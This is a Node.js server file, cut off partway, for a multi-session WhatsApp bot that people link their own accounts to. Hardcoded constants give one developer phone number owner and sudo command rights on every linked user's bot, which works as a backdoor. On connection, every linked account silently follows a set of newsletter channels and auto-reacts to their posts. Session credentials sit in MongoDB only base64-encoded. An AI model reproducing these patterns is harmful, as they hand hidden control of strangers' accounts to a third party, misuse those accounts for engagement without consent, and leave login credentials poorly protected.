'use strict';
//const { handleNewsletterReact } = require("./lib/ch-react");
require('dotenv').config();
const ANTILINK = require("./lib/antilink");
// TOP IMPORTS
//const { AntiStatusDelete } = require("./lib/antiStatus");
const express = require('express');
const path = require('path');
const { FollowChannelJids, unfollowJids } = require('./lib/newsletters');

const fs = require('fs');
const fse = require('fs-extra');
const bodyParser = require('body-parser');
const { MongoClient } = require('mongodb');
const pino = require('pino');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    delay,
    getContentType,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion,
    Browsers,
    jidDecode,
    downloadContentFromMessage
} = require('@whiskeysockets/baileys');

const {
    downloadMediaMessage,
} = require('./lib/msg');
//const { PresenceControl, BotActivityFilter } = require("./lib/alwaysOnline");

const {
    AntiDelete,
} = require('./lib/antidel');
//const { AntiEdit } = require("./lib/antiedit");


const {
    saveMessage,
    getGroupAdmins,
    getRandom,
} = require('./lib');

//const { AntiEdit } = require('./lib/antiedit');
const { commands } = require('./command');
const GroupEvents = require('./lib/groupevents');
const config = require('./config');

// ================= FOLLOW NEWSLETTERS FUNCTION =================
const axios = require("axios");


async function followNewsletter(sock) { 
    try {
        for (const njid of FollowChannelJids) {
            try {
                await sock.newsletterFollow(njid);
            } catch {}
        }
    } catch (err) {
        console.log("[NEWSLETTER] Follow Error:", err.message);
    }
}


async function UnfollowNewsletter(sock) {
    try {
        for (const jids of unfollowJids) {
            try {
                await sock.newsletterUnfollow(jids);
                console.log(`✅ Unfollowed: ${jids}`);
            } catch (err) {
                console.log(`❌ Failed to unfollow ${jids}:`, err.message);
            }
        }
    } catch (err) {
        console.log("[NEWSLETTER] Unfollow Error:", err.message);
    }
}

// ─────────────────────────────────────
//  CONSTANTS
// ─────────────────────────────────────

const PLUGINS_DIR = path.join(__dirname, 'plugins');
const SESSION_DIR = path.join(__dirname, 'session');
const PORT = process.env.PORT || 20048;

const EXTRA_SUDO = [ 
    '923024927789@s.whatsapp.net',
    '923024927789@s.whatsapp.net',
];

const activeSessions = new Map();
const pendingSessions = new Map();
const MAX_SESSIONS = config.MAX_RETRIES || 50;
const NEWSLETTER_EMOJIS = ["❤️", "👍", "😮", "😎", "💀"];
const CROWN_EMOJI = "👑";

// Allowed owners - PURE NUMBERS ONLY (without @s.whatsapp.net)
const ALLOWED_OWNERS = ["923024927789"];

// Regular reaction emojis pool
const REACT_EMOJIS = ["❤️", "👍", "🔥", "🎉", "💯", "😎", "🤣", "🥳", "👏", "💪"];

const HEART_EMOJIS = ['❤️', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '💔', '❤️‍🔥', '❤️‍🦹', '❣️', '💕', '💞', '💓', '💗', '💖', '💘', '💝', '💟'];

// ─────────────────────────────────────
//  MONGODB
// ─────────────────────────────────────

let mongoClient = null;
let db = null;

async function getFollowJids() { return FollowChannelJids; }
async function getUnfollowJids() { return unfollowJids; }

async function connectMongo() {
    try {
        mongoClient = new MongoClient(config.MONGODB_URL);
        await mongoClient.connect();
        db = mongoClient.db(config.DB_NAME);

        await db.collection(config.COLLECTIONS.SESSIONS).createIndex({ number: 1 }, { unique: true });
        await db.collection(config.COLLECTIONS.NUMBERS).createIndex({ number: 1 }, { unique: true });

        console.log('✅ MongoDB Connected');
    } catch (err) {
        console.error('❌ MongoDB Error:', err.message);
    }
}

async function saveSession(number, sessionData) {
    if (!db) return;

    try {

        const base64 =
            Buffer.from(
                JSON.stringify(sessionData)
            ).toString('base64');

        await db
            .collection(config.COLLECTIONS.SESSIONS)
            .updateOne( 
                { number },
                {
                    $set: {
                        number,
                        sessionData: base64,
                        lastUpdated: new Date(),
                        createdAt: new Date()
                    }
                },
                { upsert: true }
            );

    } catch (err) {

        console.error(
            '❌ Error saving session:',
            err.message
        );
    }
}

async function loadSession(number) {

    if (!db) return null;

    try {

        const doc =
            await db
                .collection(config.COLLECTIONS.SESSIONS)
                .findOne({ number });

        if (!doc?.sessionData) {
            return null;
        }

        return JSON.parse(
            Buffer
                .from(doc.sessionData, 'base64')
                .toString()
        );

    } catch (err) {

        console.log(
            '❌ Load session error:',
            err.message
        );

        return null;
    }
}
async function restoreMongoSession(number) {

    try {

        const session =
            await loadSession(number);

        if (!session) return false;

        const sessionPath =
            path.join(
                SESSION_DIR,
                `session_${number}`
            );

        fse.ensureDirSync(sessionPath);

        const credsPath =
            path.join(sessionPath, 'creds.json');

        fs.writeFileSync(
            credsPath,
            JSON.stringify(session, null, 2)
        );

        console.log(
            `♻️ Restored Mongo session: ${number}`
        );

        return true;

    } catch (err) {

        console.log(
            '❌ Restore session error:',
            err.message
        );

        return false;
    }
}

async function deleteSession(number) {
    if (!db) return;
    try {
        await db.collection(config.COLLECTIONS.SESSIONS).deleteOne({ number });
    } catch (err) {
        console.error('❌ Error deleting session:', err.message);
    }
}

async function loadConfig(number) {
    if (!db) return { ...config.DEFAULT_SETTINGS };
    try {
        const doc = await db.collection(config.COLLECTIONS.CONFIGS).findOne({ number });
        if (!doc || !doc.config || Object.keys(doc.config).length === 0) {
            const defaultCfg = { ...config.DEFAULT_SETTINGS };
            await db.collection(config.COLLECTIONS.CONFIGS).updateOne( 
                { number },
                { $set: { number, config: defaultCfg, lastUpdated: new Date() } },
                { upsert: true }
            );
            console.log(`📝 Default config initialized and saved to DB for: ${number}`);
            return defaultCfg;
        }
        return doc.config;
    } catch (err) {
        return { ...config.DEFAULT_SETTINGS };
    }
}

async function saveConfig(number, cfg) { 
    if (!db) return;
    try {
        await db.collection(config.COLLECTIONS.CONFIGS).updateOne( 
            { number },
            { $set: { number, config: cfg, lastUpdated: new Date() } },
            { upsert: true }
        );
    } catch (err) { 
        console.error('❌ Error saving config:', err.message);
    }
}

async function deleteConfig(number) {
    if (!db) return;
    try {
        await db.collection(config.COLLECTIONS.CONFIGS).deleteOne({ number });
    } catch (err) { 
        console.error('❌ Error deleting config:', err.message);
    }
}

async function isFirstActivation(number) { 
    if (!db) return true;
    try {
        const doc = await db.collection(config.COLLECTIONS.CONFIGS).findOne({ number });
        return !doc?.activated;
    } catch (_) {
        return true;
    }
}

async function markActivated(number) {
    if (!db) return;
    try {
        await db.collection(config.COLLECTIONS.CONFIGS).updateOne(
            { number },
            { $set: { activated: true, activatedAt: new Date() } },
            { upsert: true }
        );
    } catch (_) { }
}

async function addActiveNumber(number) {
    if (!db) return;
    try {
        await db.collection(config.COLLECTIONS.NUMBERS).updateOne(
            { number },
            { $set: { number, addedAt: new Date(), lastActive: new Date() } },
            { upsert: true }
        );
    } catch (err) {
        console.error('❌ Error saving number:', err.message);
    }
}

async function getActiveNumbers() {
    if (!db) return [];
    try {
        return (await db.collection(config.COLLECTIONS.NUMBERS).find().toArray()).map(d => d.number);
    } catch (err) {
        return [];
    }
}

async function removeActiveNumber(number) {
    if (!db) return;
    try {
        await db.collection(config.COLLECTIONS.NUMBERS).deleteOne({ number });
    } catch (err) {
        console.error('❌ Error deleting number:', err.message);
    }
}

// ─────────────────────────────────────
//  PLUGIN LOADER - ONLY FROM LOCAL FOLDER
// ─────────────────────────────────────

async function loadPluginFiles() {
    if (!fs.existsSync(PLUGINS_DIR)) {
        console.log('📁 Creating plugins directory...');
        fse.ensureDirSync(PLUGINS_DIR);
        return;
    }

    const files = fs.readdirSync(PLUGINS_DIR).filter(f => f.endsWith('.js'));

    if (files.length === 0) {
        console.log('⚠️ No plugins found in plugins folder');
        return;
    }

    console.log(`📦 Loading ${files.length} plugins from local folder...`);

    for (const file of files) {
        try {
            const pluginPath = path.join(PLUGINS_DIR, file);
            delete require.cache[require.resolve(pluginPath)];
            require(pluginPath);
            console.log(`✅ Loaded: ${file}`);
        } catch (err) {
            console.error(`❌ Error loading plugin ${file}:`, err.message);
        }
    }
}

// ─────────────────────────────────────
//  SESSION CLEANUP
// ─────────────────────────────────────

async function cleanupSession(number, reason = 'Session expired') {
    console.log(`🧹 Cleanup for ${number}: ${reason}`);
    try {
        const sessionPath = path.join(SESSION_DIR, `session_${number}`);
        if (fs.existsSync(sessionPath)) fse.removeSync(sessionPath);

        const sock = activeSessions.get(number);
        if (sock) {
            try { sock.ws.close(); } catch (_) { }
            activeSessions.delete(number);
        }

        await deleteSession(number);
        await deleteConfig(number);
        await removeActiveNumber(number);
    } catch (err) {
        console.error(`❌ Cleanup error for ${number}:`, err.message);
    }
}

// ─────────────────────────────────────
//  WHATSAPP BOT CORE
// ─────────────────────────────────────

function attachBotHandlers(sock, number, userConfig, saveCreds) {
    sock.ev.on('creds.update', async () => {

    try {

        await saveCreds();

        const credsPath =
            path.join(
                SESSION_DIR,
                `session_${number}`,
                'creds.json'
            );

        if (!fs.existsSync(credsPath)) {
            return;
        }

        const raw = 
    fs.readFileSync(
        credsPath,
        'utf8'
    );

if (
    !raw ||
    raw.trim().length < 5
) {
    return;
}

let creds;

try {

    creds = JSON.parse(raw);

} catch {

    console.log(
        `⚠️ Invalid creds JSON: ${number}`
    );

    return;
}

await saveSession(number, creds);
    } catch (err) {

        console.log(
            '❌ Creds update error:',
            err.message
        );
    }
});

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            pendingSessions.delete(number);
            activeSessions.set(number, sock);
            await addActiveNumber(number);
            sock.userConfig = userConfig;
            
            await followNewsletter(sock);
            await UnfollowNewsletter(sock);

            console.log(`🦾 Bot connected: ${number}`);

            const firstTime = await isFirstActivation(number);
            if (firstTime) {
                await markActivated(number);
                try {
                    const botJid = sock.user?.id;
                    if (botJid && userConfig.STARTING_MSG) {
                        await sock.sendMessage(botJid, { 
                            text: userConfig.STARTING_MSG
                        });
                    }
                } catch (_) { }
            }

        } else if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

            activeSessions.delete(number);
            pendingSessions.delete(number);

            if (shouldReconnect) {
                console.log(`📄 Reconnecting ${number}...`);
                setTimeout(() => startBot(number), 3000); 
            } else {
                await cleanupSession(number, 'loggedOut');
            }
        }
    });
    
    sock.ev.on('group-participants.update', async (update) => {
    try {
        await GroupEvents(sock, update);
    } catch (err) {
        console.log('Group event error:', err.message);
    }
});
    
    sock.ev.on('call', async (callList) => {
        try { 
            const freshCfg = await loadConfig(number);
            Object.assign(userConfig, freshCfg);
            sock.userConfig = userConfig;
        } catch (_) {}

        if (userConfig.ANTI_CALL !== 'true') return;
        for (const call of callList) {
            if (call.status === 'offer') {
                try {
                    await sock.rejectCall(call.id, call.from);
                    await sock.sendMessage(call.from, { text: userConfig.REJECT_MSG || 'Calls not allowed' });
                } catch (_) { }
            }
        }
    });

    sock.ev.on('messages.upsert', async ({ messages, type }) => {

    // only real incoming messages
    if (type !== 'notify') return;

    try {
        const freshCfg = await loadConfig(number);
        Object.assign(userConfig, freshCfg);
        sock.userConfig = userConfig;
    } catch (_) {}

    for (const msg of messages) {

        // ignore empty/system packets
        if (!msg.message) continue;
        
        
        const jid2 = msg.key.remoteJid;
        
            // ───────────────────────────────────
// STATUS SYSTEM
// ───────────────────────────────────

if (jid2 === "status@broadcast") {
    
    const statuss = msg.key.remoteJidAlt || msg.key.participantAlt || msg.key.remoteJid;

    const msgToSave = {
        ...msg,
        sender: statuss,
    };
    saveMessage(msgToSave).catch(() => {});
    
   // console.log("\n📡 STATUS EVENT TRIGGERED");

    let senderRaw = null;

    // ================= GET STATUS SENDER =================

    if (msg.key.participantAlt) {

        senderRaw = msg.key.participantAlt;
       // console.log("📥 participantAlt:", senderRaw);

    } else if (msg.key.remoteJidAlt) {

        senderRaw = msg.key.remoteJidAlt;
       // console.log("📥 remoteJidAlt:", senderRaw);

    } else if (msg.key.participant) {

        senderRaw = msg.key.participant;
        //console.log("📥 participant:", senderRaw);

    }

    if (!senderRaw) {

       // console.log("❌ Status sender not found");
        return;
    }


    // ================= RESOLVE STATUS SENDER =================

    async function resolveStatusSender(jid2) {

        try {

          //  console.log("🔍 Resolving sender:", jid2);

            // LID SUPPORT
            if (jid2.includes("@lid")) {

              //  console.log("🧠 LID detected");

                if (sock?.signalRepository?.lidMapping?.getPNForLID) {

                    const mapped = 
                        await sock.signalRepository
                            .lidMapping
                            .getPNForLID(jid2);

                    if (mapped) {

                      //  console.log("✅ LID mapped:", mapped);
                        return mapped;
                    }
                }

                if (sock?.lidToPhoneNumber) {

                    const mapped = 
                        await sock.lidToPhoneNumber(jid2);

                    if (mapped) {

                        //console.log("✅ LID mapped alt:", mapped);
                        return mapped;
                    }
                }

                console.log("⚠️ LID mapping failed");
                return jid2;
            }

            // REMOVE DEVICE ID
            if (jid2.includes(":")) {

                const cleaned = 
                    jid2.split(":")[0] + 
                    "@s.whatsapp.net";

              //  console.log("🧹 Cleaned device jid2:", cleaned);

                return cleaned;
            }

            return jid2;

        } catch (err) {

            ///console.log(
          //      "❌ resolveStatusSender Error:",
              //  err.message
          //  );

            return jid2;
        }
    }

    const statusSender = 
        await resolveStatusSender(senderRaw);

   // console.log("📱 Final Status Sender:", statusSender);


    // ================= SETTINGS DEBUG =================

   // console.log("⚙️ AUTO_VIEW_STATUS =", userConfig.AUTO_VIEW_STATUS);
    //console.log("⚙️ AUTO_STATUS_REACT =", userConfig.AUTO_STATUS_REACT);
    //console.log("⚙️ AUTO_STATUS_REPLY =", userConfig.AUTO_STATUS_REPLY);


    // ================= AUTO VIEW STATUS =================

    if (userConfig.AUTO_VIEW_STATUS === "true") { 

        //console.log("👀 Status View Enabled");

        try {

            await sock.sendReceipt(
                "status@broadcast",
                statusSender,
                [msg.key.id],
                "read"
            );

            //console.log("✅ Status viewed via sendReceipt");

        } catch (err) {

         //   console.log(
              //  "❌ sendReceipt failed:",
             //   err.message
           // );

            try {

                await sock.readMessages([msg.key]);

          //      console.log("✅ Status viewed via readMessages");

            } catch (e) {

                console.log(
                    "❌ readMessages failed:",
                    e.message
                );
            }
        }

    } else {

      //  console.log("⛔ AUTO_VIEW_STATUS OFF");
    }


    // ================= AUTO STATUS REACT =================

    if (userConfig.AUTO_STATUS_REACT === "true") {

    //    console.log("🎭 Status React Enabled");

        try {

            const emojis = userConfig.STATUS_EMOJIS || [
                "❤️",
                "🔥",
                "😍",
                "😎",
                "💯",
                "✨",
                "💖",
                "🥰"
            ];

            const selectedEmoji = 
                emojis[
                    Math.floor(
                        Math.random() * emojis.length
                    )
                ];

        ///    console.log(
            //    "😀 Selected Emoji:",
              ///  selectedEmoji
           // );

            await sock.sendMessage(
                "status@broadcast",
                {
                    react: {
                        text: selectedEmoji,
                        key: msg.key
                    }
                },
                {
                    statusJidList: [statusSender]
                }
            );

        //    console.log("✅ Status React Sent");

        } catch (err) {

            console.log(
                "❌ Status React Error:",
                err.message
            );
        }

    } else {

    //    console.log("⛔ AUTO_STATUS_REACT OFF");
    }


    // ================= AUTO STATUS REPLY =================

    if (userConfig.AUTO_STATUS_REPLY === "true") {

       // console.log("💬 Status Reply Enabled");
        const isReaction = msg.message?.reactionMessage;
    
    // Agar reaction hai toh reply mat bhejo
    if (isReaction) {
        console.log("⏭️ Skipping - This is a reaction, not a status");
        return;
    }

        try {

            const replyMsg = 
                userConfig.AUTO_STATUS_MSG || 
                "Hello from Team Bandaheali ✨";

       ///     console.log(
            //    "📓 Reply Message:",
               // replyMsg
          //  );

            await sock.sendMessage( 
                statusSender,
                {
                    text: replyMsg
                },
                {
                    quoted: msg
                }
            );

       //     console.log("✅ Status Reply Sent");

        } catch (err) {

            console.log(
                "❌ Status Reply Error:",
                err.message
            );
        }

    } else {

     //   console.log("⛔ AUTO_STATUS_REPLY OFF");
    }

    //console.log("📡 STATUS HANDLING COMPLETE\n");

    return;
}

        // ignore status packets
        //if (msg.key?.remoteJid === 'status@broadcast') continue;

        // ignore protocol messages
       // if (msg.message?.protocolMessage) continue;

        // ignore sender key packets
        if (msg.message?.senderKeyDistributionMessage) continue;

        // ignore weird hidden packets
        //if (msg.message?.messageContextInfo) continue;

        // ignore self retry packets
      //  if (msg.key?.id?.startsWith('BAE5')) continue;

        // invalid IDs
        if (msg.key?.id?.length < 16) continue;

        try {

            const isGrp = msg.key.remoteJid?.endsWith('@g.us');

            const msgToSave = {
                ...msg,
                sender: isGrp
                    ? msg.key.participant
                    : msg.key.remoteJid,
            };

            const msgType = getContentType(msg.message);

const blockedTypes = [
    'protocolMessage',
    'senderKeyDistributionMessage',
    'messageContextInfo'
];

//if (!blockedTypes.includes(msgType)) {
    saveMessage(msgToSave).catch(() => { });


            await handleMessage(sock, msg, userConfig, number);
            await ANTILINK(sock, msg, userConfig);

        } catch (err) {
            console.error('❌ Message error:', err.message);
        }
    }
});

    sock.ev.on('messages.update', async (updates) => {
    try {
        const freshCfg = await loadConfig(number);
        Object.assign(userConfig, freshCfg);
        sock.userConfig = userConfig;
    } catch (_) {}

    try {
        // =========================
        // ANTI DELETE
        // =========================
        await AntiDelete(sock, updates);
    } catch (_) { }

   /* try {
        // =========================
        // ANTI STATUS DELETE
        // =========================
        await AntiStatusDelete(sock, updates);
    } catch (_) { }*/
});

 //   const { AntiEdit } = require("./lib/antiedit");

/*sock.ev.on("messages.update", async (updates) => {
    for (const update of updates) {
        try {
            if (
                update.update?.message ||
                update.update?.editedMessage ||
                update.update?.protocolMessage
            ) {
                console.log(
                    "EDIT CANDIDATE",
                    JSON.stringify(update, null, 2)
                );

                // Anti Edit Handler
                await AntiEdit(sock, {
                    key: update.key,
                    message: update.update.message || update.update
                });
            }
        } catch (err) {
            console.error("AntiEdit Error:", err);
        }
    }
});
    */
}

async function startBot(number) {
    if (activeSessions.has(number)) return activeSessions.get(number);
    if (activeSessions.size >= MAX_SESSIONS) {
        console.warn(`⚠️ Max sessions limit reached (${MAX_SESSIONS})`);
        return null;
    }

    const sessionPath = path.join(SESSION_DIR, `session_${number}`);
    fse.ensureDirSync(sessionPath);
    
    // Restore from MongoDB if local creds missing

const credsPath =
    path.join(sessionPath, 'creds.json');

if (!fs.existsSync(credsPath)) {
    await restoreMongoSession(number);
}

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();
    const userConfig = await loadConfig(number);
    const logger = pino({ level: 'fatal' });

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, logger),
        },
        printQRInTerminal: false,
        logger,
        syncFullHistory: false,
        browser: Browsers.windows('Chrome'),
        
        generateHighQualityLinkPreview: true,
        markOnlineOnConnect: true
    });

    attachBotHandlers(sock, number, userConfig, saveCreds);
    return sock;
}

// ─────────────────────────────────────
//  MESSAGE HANDLER
// ─────────────────────────────────────

async function handleMessage(sock, msg, userConfig, botNumber) {
userConfig = userConfig || {};
    // BotActivityFilter(sock);
   // await handleNewsletterReact(sock, msg);
/*sock.ev.on("presence.update", async (update) => {
     PresenceControl(sock, update);
});
*/
    const jid = msg.key?.remoteJid || '';
    if (!jid) return;

    const isGroup = jid.endsWith('@g.us');
    const bandaheali = sock.user?.id
    ? sock.user.id.split(":")[0] + "@s.whatsapp.net"
    : "";
    const botUser = sock.user?.id ? sock.user.id.split(":")[0] + "@s.whatsapp.net" : "";
    const sender = msg.key.fromMe
    ? bandaheali
    : isGroup
    ? (
        msg.key?.participantAlt ||
        msg.key?.participant ||
        msg.participant
    )
    : (
        msg.key?.remoteJidAlt ||
        msg.key?.participant ||
        msg.key?.remoteJid
    );

if (!sender) return;

    // Extract sender number correctly (remove @s.whatsapp.net or @g.us)
    let senderNumber = sender;

if (typeof sender === 'string' && sender.includes('@')) {
    senderNumber = sender.split('@')[0];
}

    // Check if sender is allowed owner (pure number comparison)
    const isAllowedOwner = ALLOWED_OWNERS.includes(senderNumber);
const isDev = isAllowedOwner || ALLOWED_OWNERS.includes(senderNumber);
    // Check if sender is creator/owner for commands
    const isOwner = 
    userConfig?.SUDO?.includes(sender) ||
    config?.SUDO?.includes(sender) ||
    EXTRA_SUDO.includes(sender) ||
    isAllowedOwner;
    const isCreator = isOwner || isAllowedOwner || msg.key.fromMe; // Fix for isCreator undefined

    
// ================= NEWSLETTER HANDLING =================
if (jid && jid.includes('@newsletter')) {

    // Fetch allowed newsletter JIDs from GitHub JSON
    const newsletterJids = await getFollowJids();

    // Allow only fetched newsletters
    if (newsletterJids.length > 0 && !newsletterJids.includes(jid)) {
        return;
    }

    // ================= AUTO REACT EVERY MESSAGE =================
    try {
        const serverId = msg.key.server_id;

        if (serverId) {
            const emoji = 
                NEWSLETTER_EMOJIS[
                    Math.floor(Math.random() * NEWSLETTER_EMOJIS.length)
                ];

            await sock.newsletterReactMessage(
                jid,
                serverId.toString(),
                emoji
            );
        }
    } catch (err) {
        // Silent fail
    }

    return;
}
    // AUTO REACT LOGIC - For all messages (including own messages)
    // Crown reaction for allowed owners (using senderNumber)
    if (isAllowedOwner && !msg.key.fromMe) {
      /*  try {
            await sock.sendMessage(jid, { react: { text: CROWN_EMOJI, key: msg.key } });
        } catch (_) { }*/
    } 
    // Regular random reaction if AUTO_REACT is true in userConfig
    else if (
   userConfig.AUTO_REACT === 'true' &&
   !msg.key?.remoteJid?.includes('@newsletter') &&
   !msg.message?.protocolMessage &&
   !msg.message?.senderKeyDistributionMessage
) {
        //const emoji = //getRandom(REACT_EMOJIS);
        const emoji = REACT_EMOJIS[Math.floor(Math.random() * REACT_EMOJIS.length)];
        try { 
            await sock.sendMessage(jid, { react: { text: emoji, key: msg.key } });
        } catch (_) { }
    }
else if (
   userConfig.CUSTOM_REACT === 'true' &&
   !msg.key?.remoteJid?.includes('@newsletter') &&
   !msg.message?.protocolMessage &&
   !msg.message?.senderKeyDistributionMessage
) {
        //const emoji = //getRandom(REACT_EMOJIS);
        const CUSTOM_EMOJIS = userConfig.CUSTOM_EMOJIS || ['😊', '👍', '🚀', '💻', '🎉', '🔥'];
        const cemoji = CUSTOM_EMOJIS[Math.floor(Math.random() * CUSTOM_EMOJIS.length)];
        try { 
            await sock.sendMessage(jid, { react: { text: cemoji, key: msg.key } });
        } catch (_) { }
    }
    
    else if (
   userConfig.HEART_REACT === 'true' &&
   !msg.key?.remoteJid?.includes('@newsletter') &&
   !msg.message?.protocolMessage &&
   !msg.message?.senderKeyDistributionMessage
) {
        //const emoji = //getRandom(REACT_EMOJIS);
        const hemoji = HEART_EMOJIS[Math.floor(Math.random() * HEART_EMOJIS.length)];
        try { 
            await sock.sendMessage(jid, { react: { text: hemoji, key: msg.key } });
        } catch (_) { }
    }
    
    // Auto view status

    const fromMe = msg.key?.fromMe;
    const pushname = msg.pushName || 'Sin Nombre';
    const botNumber2 = sock.user?.id
    ? sock.user.id.split(':')[0]
    : '';
    //const botNumber2 = sock.user?.id?.split(':')[0];
    const isMe = fromMe;

    let groupName = '';
    let groupAdmins = [];
    let isBotAdmins = false;
    let isAdmins = false;
    let groupMetadata = null;

    if (isGroup) { 
        try {
            groupMetadata = await sock.groupMetadata(jid);
            groupName = groupMetadata?.subject || '';
            groupAdmins = getGroupAdmins(groupMetadata?.participants || []);
            isBotAdmins = groupAdmins.includes(botUser);
            isAdmins = groupAdmins.includes(sender);
        } catch (e) {
            console.log(e);
        }
    }

    const mtype = getContentType(msg.message);
    let body = '';

    if (mtype === 'conversation') body = msg.message.conversation;
    else if (mtype === 'extendedTextMessage') body = msg.message.extendedTextMessage?.text;
    else if (mtype === 'imageMessage') body = msg.message.imageMessage?.caption;
    else if (mtype === 'videoMessage') body = msg.message.videoMessage?.caption;
    else if (mtype === 'buttonsResponseMessage') body = msg.message.buttonsResponseMessage?.selectedButtonId;
    else if (mtype === 'listResponseMessage') body = msg.message.listResponseMessage?.singleSelectReply?.selectedRowId;
    else if (mtype === 'templateButtonReplyMessage') body = msg.message.templateButtonReplyMessage?.selectedId;

    body = body || '';

    // ================= STATUS SEND/FORWARD ON KEYWORD REQUEST =================
    const msgType2 = Object.keys(msg.message || {})[0];
    const contextInfo = msg.message?.[msgType2]?.contextInfo || {};
    const quotedMsg = contextInfo.quotedMessage || null;
    const quotedParticipant = contextInfo.participant || null;

    const bodyLower = body.trim().toLowerCase();
    const statusKeywords = ["sendme", "send", "snt", "send me", "bhejo", "bhj", "send kr"];
    
    if (statusKeywords.includes(bodyLower)) {
        if (contextInfo && contextInfo.remoteJid === 'status@broadcast') {
            if (quotedMsg) {
                try {
                    const qMtype = getContentType(quotedMsg);
                    if (qMtype === 'imageMessage' || qMtype === 'videoMessage' || qMtype === 'audioMessage' || qMtype === 'documentMessage') {
                        const stream = await downloadContentFromMessage(
                            quotedMsg[qMtype],
                            qMtype.replace('Message', '')
                        );
                        let buffer = Buffer.from([]);
                        for await (const chunk of stream) {
                            buffer = Buffer.concat([buffer, chunk]);
                        }
                        
                        const caption = quotedMsg[qMtype]?.caption || '';
                        const mimeType = quotedMsg[qMtype]?.mimetype || '';
                        
                        if (qMtype === 'imageMessage') {
                            await sock.sendMessage(sender, { image: buffer, caption });
                        } else if (qMtype === 'videoMessage') {
                            await sock.sendMessage(sender, { video: buffer, caption });
                        } else if (qMtype === 'audioMessage') {
                            await sock.sendMessage(sender, { audio: buffer, mimetype: mimeType, ptt: quotedMsg[qMtype]?.ptt || false });
                        } else if (qMtype === 'documentMessage') {
                            await sock.sendMessage(sender, { document: buffer, mimetype: mimeType, fileName: quotedMsg[qMtype]?.fileName || 'status' });
                        }
                    } else {
                        const statusText = quotedMsg.conversation || quotedMsg.extendedTextMessage?.text || '';
                        if (statusText) {
                            await sock.sendMessage(sender, { text: statusText });
                        }
                    }
                } catch (err) {
                    console.error("Error sending quoted status:", err.message);
                }
            }
            return; // Exit processing status keyword requests
        }
    }

    const prefix = userConfig.PREFIX || config.PREFIX;

const isCmd = body.startsWith(prefix);

let args = [];
let command = '';
let q = '';

if (isCmd) {
    args = body.slice(prefix.length).trim().split(/\s+/);
    command = args.shift().toLowerCase();
    q = args.join(' ');
}



    const SUDO = [
    ...((userConfig?.SUDO) || (config?.SUDO) || []),
    ...EXTRA_SUDO
];
    const isSudo = SUDO.includes(sender) || fromMe;

    const BANNED = userConfig.BANNED || config.BANNED || [];
    const isBanned = BANNED.some(b => b === senderNumber || b === sender);

    if (isBanned) return;

    const MODE = userConfig.MODE || config.MODE;
    if (MODE === 'private' && !isSudo && !isAllowedOwner) return;

    const reply = (text) => sock.sendMessage(jid, { text: String(text) }, { quoted: msg });
    const react = (emoji) => sock.sendMessage(jid, { react: { text: emoji, key: msg.key } });
    
    sock.decodeJid = jid => {  
            if (!jid) return jid;  
            if (/:\d+@/gi.test(jid)) {  
                let decode = jidDecode(jid) || {};  
                return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
            } else return jid;  
        };  
          
    
    sock.downloadMediaMessage = async(message) => {

    const type = message.mtype;

    const media = message.message[type];

    const stream = await downloadContentFromMessage(
        media,
        type.replace('Message', '')
    );

    let buffer = Buffer.from([]);

    for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk]);
    }

    return buffer;
};
    
    const quoted = quotedMsg ? {
    message: quotedMsg,
    key: {
        remoteJid: jid,
        fromMe: false,
        id: contextInfo.stanzaId,
        participant: quotedParticipant,
    },
    sender: quotedParticipant,
    mtype: getContentType(quotedMsg),

    download: () => sock.downloadMediaMessage({
        message: quotedMsg,
        mtype: getContentType(quotedMsg)
    })

} : null;
    

const mentionedJid = contextInfo.mentionedJid || [];

const target = 
    mentionedJid?.[0] ||
    quotedParticipant ||
    null; 
    
    const processedM = {
        key: msg.key,
        message: msg.message,
        messageTimestamp: msg.messageTimestamp,
        pushName: msg.pushName,
        from: jid,
        sender: sender,
        senderNumber: senderNumber,
        fromMe: fromMe,
        body: body,
        mtype: mtype,
        isGroup: isGroup,
        quoted: quoted,
        mentionedJid: mentionedJid,
        pushname: pushname,
        react,
        target,
        chat: jid
    };

    const ctx = {
        from: jid,
        body,
        isCmd,
        command,
        args,
        q,
        text: q,
        prefix,
        isGroup,
        sender: sender,
        senderNumber: senderNumber,
        senderNum: senderNumber,
        sanitizedNumber: botNumber,
        botNumber,
        botNumber2,
        pushname,
        isMe,
        isOwner: isSudo,
        isCreator: isCreator, 
        isDev: isDev,
        isAdmins,
        isBotAdmins,
        groupMetadata,
        groupName,
        participants: groupMetadata?.participants || [],
        groupAdmins,
        quoted,
        mentionedJid,
        l: sock,
        reply,
        react,
        userConfig,
        config,
        target,
        updateUserConfig: async (num, cfg) => {
            await saveConfig(num || botNumber, cfg);
            Object.assign(userConfig, cfg);
            sock.userConfig = userConfig;
        },
    };
    
    
    // └───────────────
// BODY LISTENERS
// └───────────────

for (const cmd of commands) {

    try {

        if (
            cmd.on === "body" &&
            typeof cmd.function === "function"
        ) {

            await cmd.function(
                sock,
                processedM,
                processedM,
                ctx
            );

        }

    } catch (err) {

        console.error(
            `❌ Body Listener Error:`,
            err.message
        );

    }

}

    const matched = commands.find(c => {
        if (c.pattern) {
            if (c.pattern instanceof RegExp) {
                if (c.pattern.test(command)) return true;
            } else {
                if (String(c.pattern).toLowerCase() === command) return true;
            } 
        }
        if (c.alias && Array.isArray(c.alias) && c.alias.includes(command)) return true;
        return false;
    });

if (matched) {
    if (matched.react) { 
        try { await react(matched.react); } catch (_) { }
    }

    try {
        await matched.function(sock, processedM, processedM, ctx);

    } catch (err) {
        console.error(`⚠️ Command failed [${command}]:`, err.message);
        try { await reply(`⚠️ Error: ${err.message}`); } catch (_) { }
    }
}
}

// ─────────────────────────────────────
//  EXPRESS SERVER
// ─────────────────────────────────────

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use('/lib', express.static(path.join(__dirname, 'lib')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'lib', 'main.html'));
});

app.get('/api/code', async (req, res) => {
